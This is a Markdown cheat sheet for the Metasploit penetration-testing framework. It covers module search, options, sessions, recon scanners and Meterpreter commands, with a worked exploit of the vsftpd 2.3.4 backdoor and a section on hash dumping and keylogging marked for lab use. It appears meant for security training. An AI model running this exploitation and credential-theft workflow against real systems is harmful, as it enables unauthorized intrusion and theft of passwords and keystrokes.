# Metasploit Cheat Sheet

## Starting Metasploit

```bash
msfconsole
````

Exit:

```bash
exit
```

---

## Searching & Selecting Modules

Search modules:

```bash
search <keyword>
```

Example:

```bash
search ftp
search type:exploit smb
```

Use a module:

```bash
use <module_path>
```

Example:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Show module info:

```bash
info
```

---

## Setting Options

View options:

```bash
show options
```

Set values:

```bash
set RHOSTS <target_ip>
set RPORT <port>
set LHOST <your_ip>
set LPORT <port>
```

Set payload:

```bash
set payload <payload_name>
```

Unset option:

```bash
unset <option>
```

---

## Running Exploits

Run module:

```bash
run
```

or:

```bash
exploit
```

Run in background:

```bash
exploit -j
```

---

## Sessions Management

List sessions:

```bash
sessions
```

Interact:

```bash
sessions -i <id>
```

Background session:

```bash
background
```

Kill session:

```bash
sessions -k <id>
```

---

## Database Commands

Check DB:

```bash
db_status
```

Show hosts:

```bash
hosts
```

Show services:

```bash
services
```

Show credentials:

```bash
creds
```

Run Nmap + store results:

```bash
db_nmap -sV <target>
```

---

## Recon Modules

ARP scan:

```bash
use auxiliary/scanner/discovery/arp_sweep
```

Port scan:

```bash
use auxiliary/scanner/portscan/tcp
```

FTP version:

```bash
use auxiliary/scanner/ftp/ftp_version
```

SMB version:

```bash
use auxiliary/scanner/smb/smb_version
```

---

## Common Exploitation Flow

```text
search → use → set options → set payload → run → session
```

Example:

```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.10
set payload cmd/unix/interact
exploit
```

---

## Meterpreter Basics

System info:

```bash
sysinfo
```

Current user:

```bash
getuid
```

Process list:

```bash
ps
```

File navigation:

```bash
ls
cd
pwd
```

Download file:

```bash
download <file>
```

Upload file:

```bash
upload <file>
```

Screenshot:

```bash
screenshot
```

---

## Credential Access (Lab Use Only)

Hash dump:

```bash
hashdump
```

Keylogging:

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

---

## Network Info

```bash
ipconfig
route
netstat
```

---

## Process Control

```bash
migrate <pid>
kill <pid>
```

---

## Workspaces

Create:

```bash
workspace -a <name>
```

Switch:

```bash
workspace <name>
```

List:

```bash
workspace
```

---

## Quick Mental Model

```text
Recon → Scan → Exploit → Session → Post-Exploit
```

---

## Key Idea

Metasploit is not just about commands — it’s about **workflow thinking**:

* Find attack surface
* Match exploit
* Deliver payload
* Control session
* Extract value (in lab/authorized environments)


